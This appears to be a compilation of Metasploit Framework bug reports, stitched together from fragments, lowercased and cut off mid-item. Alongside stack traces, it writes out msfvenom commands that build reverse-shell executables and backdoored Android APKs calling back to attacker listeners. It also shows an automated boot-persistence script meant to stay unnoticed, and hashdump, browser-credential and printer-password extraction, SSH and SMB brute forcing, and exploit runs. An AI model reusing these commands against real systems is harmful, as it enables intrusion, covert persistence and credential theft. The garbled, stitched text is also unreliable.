/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[05/20/2017 16:05:19] [e(0)] core: auxiliary failed: nomethoderror undefined method `disconnect!' for nil:nilclass
[05/20/2017 16:05:19] [d(3)] core: call stack:
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/smb.rb:136:in `ensure in attempt_login'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/smb.rb:136:in `attempt_login'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:231:in `block in scan!'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:154:in `block in each_credential'
/usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:132:in `block in each'
/usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:130:in `each_line'
/usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:130:in `each'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:141:in `each_credential'
/usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:205:in `scan!'
/usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_login.rb:113:in `run_host'
/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
launch msfconsole
load nexpose plugin
launch a nexpose scan and wait for the import process to complete.
list vulnerabilities (exaple: "vulns 192.168.1.10").
looking at the "refs=" section of each vulnerability shows nothing; they are blank.
msf auxiliary(smb_ms17_010) > set rhosts fakemachinename, rightmachinename
msf auxiliary(smb_ms17_010) > run
[-] auxiliary failed: msf::optionvalidateerror the following options failed to validate: rhosts.
establish a valid session
for this example, the session is established on 192.168.1.20
assuming the session number is "2": 1
route add 192.168.1.1/24 2
use auxiliary/server/capture/telnet
set listenercomm 2
set srvhost 192.168.1.20
do a showmount -e on an ip that returns this error: clnt_create: rpc: port mapper failure - authentication error
set that ip as rhost in the nfsmount auxiliary scanner
in .rc file auto run for persistence goes
launch and watch it go into a stupid loop, i am using linux for msf and windows for reverse shell payload launching i am using an .rc file for the auto script entry as seen below i have tested a lot of ways..
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.101
set lport 5555
set exitonsession false
set initialautorunscript persistence -u -r xxx.xxx.xxx.xxx -p 5555 -i 30 onboot=true
#set autorunscript persistence -r xxx.xxx.xxx.xxx -p 5555 -a -x -i 5
#run post/windows/manage/persistence_exe -r xxx.xxx.xxx.xxx -p 5555 -a -s -x -i 10 onboot=true
#run post/windows/manage/persistence_exe rexepath=/home/jay/scripts/msf/payloads/xorltkju.vbs rexename=conhst.vbs startup=system
#run persistence -u -i 5 -p 5555 -r xxx.xxx.xxx.xxx
exploit -j -z what i want is auto persistence 1 time per 1 ip address, this shouldnt be hard and should of already been thought off, who wants an endless loop? i sure dont i want the payload to know if the payload is already running, i also want msf to know if a stage (for persistence) has already been setup
all this works perfectly when done manually but as soon as i automate it, it launches the payload straight away, i want the payload (new persistent payload) to run at boot or user login not straight away, there are so many ways this should work but i don't know of any of them, when searching google i find nothing about this, ps this is the only way i can get automation to work correctly so the fix needs to happen in the way i have already described, please help me am i doing something wrong all i want is it to be persistent after a boot and not just load instantly and get the same stage and same persistence script running every session which crashes the windows side and the traffic sticks out like a saw thumb aswell.
when running this and exploiting the background session using post/linux/gather/hashdump, getting the below error post failed: runtimeerror could not determine uid: ""
[-] call stack:
[-] /usr/share/metasploit-framework/lib/msf/core/post/linux/priv.rb:24:in `is_root?'
[-] /usr/share/metasploit-framework/modules/post/linux/gather/hashdump.rb:27:in `run' rsions.
run a module as a job * `use auxiliary/server/socks4a` * `run`
list detailed job info * `jobs -i 0`
create modules directory that mirrors that of metasploit (exploits, auxiliary, etc)
put some modules in it.
```loadpath /path/to/your/modules``` should attempt to load the modules.
run msfconsole on the same system under two nonprivileged users.
generate a mettle payload (linux/mettle/reverse_tcp)
obtain a shell
once in shell, type 'sysinfo' or 'help, it seems to function
type 'ps' and the binary crashes and the shell dies
it would appear the problem is with the binary itself, not msf on the attack side.
use masscan to scan a netwlr
import resulting xml
observe a ton of these: ```
[04/04/2017 21:29:46] [d(0)] core: unknown attribute for ::mdm::host: task
[04/04/2017 21:29:46] [d(0)] core: unknown attribute for service: task
gain a meterpreter on a windows machine with a windows/meterpreter/reverse_tcp
try to check if a big file (for instance 5 gb) exists by using the file? method from msf::post::file tested on a windows 10 pro 64 bits.
create the payload apk file and uploaded it to my fileserver
started the handler in background (all settings like payload and port are right)
loaded the apk file onto my phone
the meterpreter tries to handle the session but then fails (reason: died) everything is set up correctly
when i try it on my girlfriends phone (s4) with lollipop then everything works fine
it's because my phone (s6 edge) runs on nougat i think
it could also be an app that blocks the connection, like my antivirus
but i disabled everything
and also, before updating to nougat (so on marshmallow) everything worked with my phone too.
resource (/root/desktop/test//master.rc)> use auxiliary/scanner/printer/canon_iradv_pwd_extract
resource (/root/desktop/test//master.rc)> run
[*] attempting to extract passwords from the address books on the mfp at 10.0.12.82
[*] attempting to extract passwords from the address books on the mfp at 10.0.12.142
[*] attempting to extract passwords from the address books on the mfp at 10.0.19.13
[*] attempting to extract passwords from the address books on the mfp at 10.0.12.232
[*] attempting to extract passwords from the address books on the mfp at 10.0.12.187
[*] attempting to extract passwords from the address books on the mfp at 10.0.12.171
[*] attempting to extract passwords from the address books on the mfp at 10.0.12.144
[*] attempting to extract passwords from the address books on the mfp at 10.0.12.220
[-] auxiliary failed: nomethoderror undefined method `code' for nil:nilclass
[-] call stack:
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/printer/canon_iradv_pwd_extract.rb:73:in `login'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/printer/canon_iradv_pwd_extract.rb:52:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[*] auxiliary module execution completed
``` ## system stuff
``` [2017.03.16-18:38:12] warning: the windows platform cannot reliably support more than 16 threads
[-] [2017.03.16-18:38:12] thread count has been adjusted to 16
[-] [2017.03.16-18:38:15] auxiliary failed: nomethoderror undefined method `gsub' for nil:nilclass
[-] [2017.03.16-18:38:15] call stack:
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/lib/metasploit/framework/login_scanner/bavision_cameras.rb:65:in `digest_auth'
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/lib/metasploit/framework/login_scanner/bavision_cameras.rb:40:in `try_digest_auth'
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/lib/metasploit/framework/login_scanner/bavision_cameras.rb:106:in `attempt_login'
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/lib/metasploit/framework/login_scanner/base.rb:231:in `block in scan!'
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/lib/metasploit/framework/login_scanner/base.rb:179:in `block in each_credential'
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/lib/metasploit/framework/credential_collection.rb:121:in `each'
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/lib/metasploit/framework/login_scanner/base.rb:141:in `each_credential'
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/lib/metasploit/framework/login_scanner/base.rb:205:in `scan!'
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/modules/auxiliary/scanner/http/bavision_cam_login.rb:113:in `bruteforce'
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/modules/auxiliary/scanner/http/bavision_cam_login.rb:134:in `run_host'
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] [2017.03.16-18:38:15] c:/utils/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.14.1/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[+] [2017.03.16-18:38:15] workspace:default progress:2/2 (100%) complete (0 sessions opened) auxiliary/scanner/http/bavision_cam_login
``` ## system stuff
use exploit/windows/ssh/freesshd_authbypass
set rhost, rport, username
exploit msf exploit(freesshd_authbypass) > exploit [*] started reverse tcp handler on 192.168.1.104:4444 [*] 192.168.1.103:45 - trying username 'user'
[*] 192.168.1.103:45 - uploading payload, this may take several minutes...
[-] 192.168.1.103:45 - exploit failed: errno::enoent no such file or directory @ rb_sysopen - /usr/share/metasploit-framework/data/exploits/cmdstager/vbs_b64
[*] exploit completed, but no session was created.
resource (external/master.rc)> use auxiliary/scanner/snmp/arris_dg950
resource (external/master.rc)> run
[-] auxiliary failed: snmp::requesttimeout host 10.0.0.104 not responding
[-] call stack:
[-] /usr/share/metasploit-framework/lib/snmp/manager.rb:241:in `get'
[-] /usr/share/metasploit-framework/lib/snmp/manager.rb:262:in `get_value'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/snmp/arris_dg950.rb:32:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[*] auxiliary module execution completed
resource (external/master.rc)> use auxiliary/scanner/telnet/telnet_version
resource (external/master.rc)> run
[-] 10.0.0.249:23 - connection reset by peer ["<internal:prelude>:76:in `__read_nonblock\'", "<internal:prelude>:76:in `read_nonblock\'", "/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.7/lib/rex/io/stream.rb:72:in `read\'", "/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.7/lib/rex/io/stream.rb:202:in `get_once\'", "/usr/share/metasploit-framework/lib/msf/core/exploit/telnet.rb:161:in `recv_telnet\'", "/usr/share/metasploit-framework/lib/msf/core/exploit/telnet.rb:147:in `recv\'", "/usr/share/metasploit-framework/lib/msf/core/exploit/telnet.rb:126:in `block in connect\'", "/usr/lib/ruby/2.3.0/timeout.rb:91:in `block in timeout\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `block in catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:106:in `timeout\'", "/usr/share/metasploit-framework/lib/msf/core/exploit/telnet.rb:124:in `connect\'", "/usr/share/metasploit-framework/modules/auxiliary/scanner/telnet/telnet_version.rb:36:in `block in run_host\'", "/usr/lib/ruby/2.3.0/timeout.rb:91:in `block in timeout\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `block in catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:106:in `timeout\'", "/usr/share/metasploit-framework/modules/auxiliary/scanner/telnet/telnet_version.rb:35:in `run_host\'", "/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run\'", "/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn\'"]
[*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
resource (external/master.rc)> use auxiliary/scanner/telnet/telnet_encrypt_overflow
resource (external/master.rc)> run
[-] 10.0.0.249:23 - 10.0.0.249:23 error: connection reset by peer ["<internal:prelude>:76:in `__read_nonblock\'", "<internal:prelude>:76:in `read_nonblock\'", "/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.7/lib/rex/io/stream.rb:72:in `read\'", "/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.7/lib/rex/io/stream.rb:202:in `get_once\'", "/usr/share/metasploit-framework/lib/msf/core/exploit/telnet.rb:161:in `recv_telnet\'", "/usr/share/metasploit-framework/lib/msf/core/exploit/telnet.rb:147:in `recv\'", "/usr/share/metasploit-framework/lib/msf/core/exploit/telnet.rb:126:in `block in connect\'", "/usr/lib/ruby/2.3.0/timeout.rb:91:in `block in timeout\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `block in catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:106:in `timeout\'", "/usr/share/metasploit-framework/lib/msf/core/exploit/telnet.rb:124:in `connect\'", "/usr/share/metasploit-framework/modules/auxiliary/scanner/telnet/telnet_encrypt_overflow.rb:43:in `block in run_host\'", "/usr/lib/ruby/2.3.0/timeout.rb:91:in `block in timeout\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `block in catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:33:in `catch\'", "/usr/lib/ruby/2.3.0/timeout.rb:106:in `timeout\'", "/usr/share/metasploit-framework/modules/auxiliary/scanner/telnet/telnet_encrypt_overflow.rb:42:in `run_host\'", "/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run\'", "/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn\'"]
[*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
i'd like this to result in a usable session, but currently it is unreliable (i think the ssh stream is getting killed and mettle isn't forking to background): ```
msf auxiliary(shodan_search) > use exploit/multi/ssh/sshexec
msf exploit(sshexec) > set payload linux/x86/mettle/reverse_tcp
payload => linux/x86/mettle/reverse_tcp
msf exploit(sshexec) > set lhost xxxxxxxxx
lhost => xxxxxxxxx
msf exploit(sshexec) > set rhost xxxxxxxxx
rhost => xxxxxxxxx
msf exploit(sshexec) > set username yyyyyyyy
username => yyyyyyyy
msf exploit(sshexec) > set password zzzzzzzz
password => zzzzzzzz
msf exploit(sshexec) > run [*] started reverse tcp handler on xxxxxxxxx:4444
[*] toaster.local:22 - sending stager...
[*] command stager progress - 39.42% done (274/695 bytes)
[*] sending stage (348152 bytes) to xxxxxxxxx
[*] meterpreter session 1 opened (xxxxxxxxx:4444 -> xxxxxxxxx:51676) at 2017-03-02 00:52:47 -0600
[*] command stager progress - 100.00% done (695/695 bytes)
[-] exploit failed: ioerror closed stream
[*] exploit completed, but no session was created.
msf exploit(sshexec) > sessions -1
[*] starting interaction with 1..
meterpreter > sysinfo
[-] unknown command: sysinfo.
1) on a host machine that has a hidpi screen (like a macbook pro with retina display): setup two vmware images: one windows target machine and one linux attacker machine with metasploit)
1a) on the windows target machine set a custom scale factor (right click the desktop -> display settings -> "change the size of text,apps, and other items"
set this value to something higher than 100% i.e
2) on linux, build a malicious file with a reverse_tcp shell something like: ./app/msvenom -p windows/shell/reverse_tcp lhost=x.x.x.x lport=x -f exe > /tmp/file.exe
3) deploy it on the windows machine through any means
4) back on the linux vm wait for the connection with commands like : msf) use explot/multi/handler
msf) set payload windows/meterpreter/reverse_tcp
msf) set lhost = x.x.x.x
msf) set lport = x
msf) exploit
msf exploit(handler) > sessions -i 1
meterpreter > screenshot -p /tmp/screenshot.jpg alternate steps to reproduce:
meterpreter > use espia
meterpreter > screengrab the meterpreter screenshot (or screengrab) command should capture all of the pixels in the windows host
the screenshot saved the upper left 1/4 of the screen
load rpc server module: `load msgrpc`
connect any meterpreter session
start interaction with the session: `sessions -i 1`
from another terminal window, connect to the rpc server: `msfrpc -u msf -p xxxxxxxx -a 127.0.0.1 -p 55552 -s`
from the rpc console, run any meterpreter command using *session.meterpreter_run_single*, for example: `rpc.call('session.meterpreter_run_single', '1', 'help')`
go back to the msfconsole terminal and try to run any command, for example `help`
msfconsole will throw an error and kick you out of the metepreter shell into the main msfconsole shell (exact error message attached below)
now try to return to the session: `sessions -i 1`
msfconsole will completely hang and there is no way to recover it, as far as i'm aware, other than sending a sigkill and restarting the whole thing
rpc interface still works though.
video example: [![asciicast]( rsions.
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set rhost and targeturi options
show payloads returns a blank
set payload linux/x86/meterpreter/reverse_tcp
msf exploit(apache_mod_cgi_bash_env_exec) > exploit [-] exploit failed: linux/x86/meterpreter/reverse_tcp is not a compatible payload.
[*] exploit completed, but no session was created
expected behavior:
should have attempted to open a meterpreter shell with the target current behavior:
payload is rejected as being incompatible.
other payload that i have tried is linux/x86/shell/reverse_tcp
also returns incompatible payload
kali linux rolling metasploit version(kali linux):
framework: 4.13.22-dev
console : 4.13.22-dev
auxiliary/scanner/ntp/ntp_monlist add rhost with open 123 msf auxiliary(ntp_monlist) > run [-] auxiliary failed: argumenterror wrong number of arguments (0 for 2)
[-] call stack:
[-] /usr/local/share/metasploit-framework/lib/msf/core/auxiliary/udp_scanner.rb:46:in `udp_sock'
[-] /usr/local/share/metasploit-framework/lib/msf/core/exploit/udp.rb:59:in `disconnect_udp'
[-] /usr/local/share/metasploit-framework/lib/msf/core/exploit/udp.rb:100:in `cleanup'
[-] /usr/local/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:44:in `cleanup'
[-] /usr/local/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:226:in `block in run'
[-] /usr/local/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `call'
[-] /usr/local/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
msf auxiliary(ntp_monlist) > version
framework: 4.13.22-dev-face944
console : 4.13.22-dev-face944 `~/.msf4/logs/framework.log` for relevant stack traces
[02/12/2017 21:20:31] [e(0)] core: thread exception: scannerbatch(scanner/ntp/ntp_monlist) critical=false error: argumenterror wrong number of arguments (0 for 2) source: /usr/local/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:211:in `run' /usr/local/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:140:in `job_run_proc' /usr/local/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:82:in `run_simple' /usr/local/share/metasploit-framework/lib/msf/base/simple/auxiliary.rb:92:in `run_simple' /usr/local/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/auxiliary.rb:102:in `cmd_run' /usr/local/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:430:in `run_command' /usr/local/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:392:in `block in run_single' /usr/local/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:386:in `each' /usr/local/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:386:in `run_single' /usr/local/share/metasploit-framework/lib/rex/ui/text/shell.rb:205:in `run' /usr/local/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start' /usr/local/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start' ./msfconsole:48:in `<main>'
``` ## system stuff
`root@linux:~# msfvenom -p <payload> -f raw <options> | my_selfmade_encoder.sh ` or `root@linux:~# msfvenom -p <payload> -f raw <options> > /tmp/payload.raw
the raw shellcode is affected by this suggested message (and i have personally wasted 2 hours trying to figure out why my payload wasn't working any more :d ) ```
root@linux:~# hexdump -c /tmp/payload.raw
00000000 54 68 69 73 20 63 6f 70 79 20 6f 66 20 6d 65 74 |this copy of met|
00000010 61 73 70 6c 6f 69 74 2d 66 72 61 6d 65 77 6f 72 |asploit-framewor|
00000020 6b 20 69 73 20 6d 6f 72 65 20 74 68 61 6e 20 74 |k is more than t|
00000030 77 6f 20 77 65 65 6b 73 20 6f 6c 64 2e 0a 20 43 |wo weeks old.
00000040 6f 6e 73 69 64 65 72 20 72 75 6e 6e 69 6e 67 20 |onsider running |
00000050 27 6d 73 66 75 70 64 61 74 65 27 20 74 6f 20 75 |'msfupdate' to u|
00000060 70 64 61 74 65 20 74 6f 20 74 68 65 20 6c 61 74 |pdate to the lat|
00000070 65 73 74 20 76 65 72 73 69 6f 6e 2e 0a 48 31 c9 |est version..h1.|
00000080 48 81 e9 b1 ff ff ff 48 8d 05 ef ff ff ff 48 bb |h......h......h.|
00000090 21 9a f0 09 d9 59 b5 dc 48 31 58 27 48 2d f8 ff |!....y..h1x'h-..|
000000a0 ff ff e2 f4 dd d2 73 ed 29 b1 79 dc 21 9a b1 58 |......s.).y.!..x|
000000b0 98 09 e7 8d 77 d2 c1 db bc 11 3e 8e 41 d2 7b 5b |....w.....>.a.{[|
000000c0 c1 11 3e 8e 01 d2 7b 7b 89 11 ba 6b 6b d0 bd 38 |..>...{{...kk..8|
000000d0 10 11 84 1c 8d a6 91 75 db 75 95 9d e0 53 fd 48 |.......u.u...s.h|
000000e0 d8 98 57 31 73 db a1 41 52 0b 95 57 63 a6 b8 08 |..w1s..ar..wc...|
the `reverse_hop_http` payload is broken
it relies on the recv post functionality which was removed back in [december of 2015](
instead of creating a session, it just constantly waits, with http requests being made from both systems
i'm attempting a fix, but my fix is so hacky and horrible i doubt it'll be of use.
i run msf > db_import ./metasploitable3/report-b1ebe60c-577e-4cdb-8ead-4d09e6474835.xml
[report-b1ebe60c-577e-4cdb-8ead-4d09e6474835.xml.txt](
ssh_login set userpass_file but dont set a password ```
msf auxiliary(ssh_login) > run [*] ssh - starting bruteforce
[*] error: 1.2.3.4: metasploit::framework::loginscanner::invalid cred details can't be blank, cred details can't be blank (metasploit::framework::loginscanner::ssh)
if you set a password it will sort of work unless of course the module doesnt take a password like ssh_login_pubkey
msf auxiliary(ssh_login_pubkey) > run [*] 1.2.3.4:22 ssh - testing cleartext keys
[*] ssh - testing 6 keys from /users/cg/hackershit/bad-ssh-keys
[*] error: 1.2.3.4: metasploit::framework::loginscanner::invalid cred details can't be blank, cred details can't be blank (metasploit::framework::loginscanner::ssh)
[*] scanned 1 of 1 hosts (100% complete)
framework: 4.13.19-dev-321fa91
console : 4.13.19-dev-321fa91
git pull today
run persistence -h line 82 in: lib/msf/base/sessions/scriptable.rb refers to incorrect script
79 'metsvc' => 'post/windows/manage/persistence_exe',
80 'migrate' => 'post/windows/manage/migrate',
81 'packetrecorder' => 'post/windows/manage/rpcapd_start',
82 'persistence' => 'post/window/manager/persistence_exe', ### i installed metasploit with:
- kali package via apt
call inspect() on any tlv packet with non-meta type > 403 rsions.
use auxiliary/server/browser_autopwn2
run rsions.
this happens frequently now with prs running specs in travis: ```
leaked constants detected under msf::modules after suite: mod6578706c6f69742f73696e676c655f7461726765745f6578706c6f6974 # exploit/single_target_exploit mod6578706c6f69742f6578697374696e675f6175746f5f746172676574 # exploit/existing_auto_target mod6578706c6f69742f6175746f5f7461726765745f77696e646f7773 # exploit/auto_target_windows mod6578706c6f69742f6175746f5f7461726765745f6c696e7578 # exploit/auto_target_linux
add `metasploit::framework::spec::constants::each.configure!` to `spec/spec_helper.rb` **note: `metasploit::framework::spec::constants::each` may report false leaks if `after(:all)` is used to clean up constants instead of `after(:each)`** ``` submit a pr on master, note travis failure randomly, e.g
open meterpreter session
migrate to user privileged process
in meterpreter, enter "background"
use post/windows/gather/enum_chrome
set session (session id)
run this only failed on a single rhost from the multiple i tried, not sure why or how
whenever i put some site that is url target in it it shows unable to create site error ```
msf > wmap_sites -h
[*] usage: wmap_sites [options] -h display this help text -a [url] add site (vhost,url) -d [ids] delete sites (separate ids with space) -l list all available sites -s [id] display site structure (vhost,url|ids) (level)
``` when i used the -a option to add it showed an error i tried putting up domain name as well as ip in it please help.
./msfvenom -p android/meterpreter/reverse_https payloaduuidtracking=true -o test.apk
default option for module "auxiliary/scanner/http/hp_imc_reportimgservlt_traversal": filepath ==> "/windows\\win.ini" but the this module expect the http response content-type to be an image ```
msf auxiliary(hp_imc_reportimgservlt_traversal) > show options module options (auxiliary/scanner/http/hp_imc_reportimgservlt_traversal): name current setting required description ---- --------------- -------- ----------- depth 4 yes traversal depth filepath /windows\\win.ini yes the name of the file to download proxies no a proxy chain of format type:host:port[,type:host:port][...] rhosts 127.0.0.1 yes the target address range or cidr identifier rport 8080 yes the target port ssl false no negotiate ssl/tls for outgoing connections targeturi /imc yes path to hp intelligent management center threads 1 yes the number of concurrent threads vhost no http server virtual host
``` the default filepath should not be an ini file.
msfvenom -p linux/x86/shell_reverse_tcp -f elf-so
`use auxiliary/scanner/http/error_sql_injection`
`set rhosts 127.0.0.1`
`run` silent exit, no traffic sent.
`run auxiliary/scanner/http/drupal_views_user_enum`
`set rhosts 127.0.0.1`
msf auxiliary(drupal_views_user_enum) > run [*] begin enumerating users at 127.0.0.1
2 usernames found...
[+] found user: bob
[+] found user: barry
[+] found user: john
[+] found user: joe
[*] usernames stored in: /home/jqian/.msf4/loot/20161209145858_default_127.0.0.1_drupal_user_798989.txt
[*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
msf auxiliary(drupal_views_user_enum) > cat /home/jqian/.msf4/loot/20161209145858_default_127.0.0.1_drupal_user_798989.txt
[*] exec: cat /home/jqian/.msf4/loot/20161209145858_default_127.0.0.1_drupal_user_798989.txt bob
msf auxiliary(drupal_views_user_enum) > ```
when using session logging, session interaction fails with nil-pointer error: ```
exploit(handler) > setg sessionlogging true
session logging will be enabled for future sessions.
sessionlogging => true
exploit(handler) > run [*] [2016.12.09-11:04:36] started reverse tcp handler on 192.168.100.100:4444 [*] [2016.12.09-11:04:36] starting the payload handler...
[*] [2016.12.09-11:04:38] sending stage (957999 bytes) to 192.168.100.40
[*] meterpreter session 1 opened (192.168.100.100:4444 -> 192.168.100.40:49287) at 2016-12-09 11:04:39 +0100 meterpreter > sysinfo computer : win
[-] error running command sysinfo: nomethoderror undefined method `chop' for nil:nilclass
[-] error while running command sysinfo: undefined method `chop' for nil:nilclass call stack:
/opt/metasploit/lib/rex/logging/sinks/timestamp_flatfile.rb:15:in `log'
/opt/metasploit/lib/rex/logging/log_dispatcher.rb:95:in `block in log'
/opt/metasploit/lib/rex/logging/log_dispatcher.rb:91:in `synchronize'
/opt/metasploit/lib/rex/logging/log_dispatcher.rb:91:in `log'
/opt/metasploit/lib/rex/logging/log_dispatcher.rb:154:in `rlog'
/opt/metasploit/lib/rex/ui/text/shell.rb:386:in `log_output'
/opt/metasploit/lib/rex/ui/text/shell.rb:278:in `print_error'
/opt/metasploit/lib/rex/post/meterpreter/ui/console.rb:123:in `log_error'
/opt/metasploit/lib/rex/post/meterpreter/ui/console.rb:115:in `rescue in run_command'
/opt/metasploit/lib/rex/post/meterpreter/ui/console.rb:104:in `run_command'
/opt/metasploit/lib/rex/ui/text/dispatcher_shell.rb:392:in `block in run_single'
/opt/metasploit/lib/rex/ui/text/dispatcher_shell.rb:386:in `each'
/opt/metasploit/lib/rex/ui/text/dispatcher_shell.rb:386:in `run_single'
/opt/metasploit/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
/opt/metasploit/lib/rex/ui/text/shell.rb:195:in `run'
/opt/metasploit/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
/opt/metasploit/lib/msf/base/sessions/meterpreter.rb:466:in `_interact'
/opt/metasploit/lib/rex/ui/interactive.rb:49:in `interact'
/opt/metasploit/lib/msf/ui/console/command_dispatcher/core.rb:1987:in `cmd_sessions'
/opt/metasploit/lib/rex/ui/text/dispatcher_shell.rb:430:in `run_command'
/opt/metasploit/lib/rex/ui/text/dispatcher_shell.rb:392:in `block in run_single'
/opt/metasploit/lib/rex/ui/text/dispatcher_shell.rb:386:in `each'
/opt/metasploit/lib/rex/ui/text/dispatcher_shell.rb:386:in `run_single'
/opt/metasploit/lib/msf/ui/console/command_dispatcher/exploit.rb:140:in `cmd_exploit'
/opt/metasploit/lib/rex/ui/text/dispatcher_shell.rb:430:in `run_command'
/opt/metasploit/lib/rex/ui/text/dispatcher_shell.rb:392:in `block in run_single'
/opt/metasploit/lib/rex/ui/text/dispatcher_shell.rb:386:in `each'
/opt/metasploit/lib/rex/ui/text/dispatcher_shell.rb:386:in `run_single'
/opt/metasploit/lib/rex/ui/text/shell.rb:205:in `run'
/opt/metasploit/lib/metasploit/framework/command/console.rb:48:in `start'
/opt/metasploit/lib/metasploit/framework/command/base.rb:82:in `start'
/opt/metasploit/msfconsole:48:in `<main>'
- using the following command to produce the paylaod
`msfvenom -x <any_apk> -p android/meterpreter/reverse_http lhost=<public_ip> lport=8080 -o name.apk
` the session will be closed after almost 5 sec
i tried all available payloads with different source apk and i faced the same issue, however when i use a **local ip**, session will be stable and i interact with the victim android phone.
`run scanner/http/etherpad_duo_login`
`set rhosts 127.0.0.1`
`set userpass_file userpass.lst`
msf auxiliary(etherpad_duo_login) > run [-] auxiliary failed: nomethoderror undefined method `include?' for nil:nilclass
[-] call stack:
[-] /home/jqian/rapid7/metasploit-framework/modules/auxiliary/scanner/http/etherpad_duo_login.rb:61:in `is_app_epaduo?'
[-] /home/jqian/rapid7/metasploit-framework/modules/auxiliary/scanner/http/etherpad_duo_login.rb:32:in `run_host'
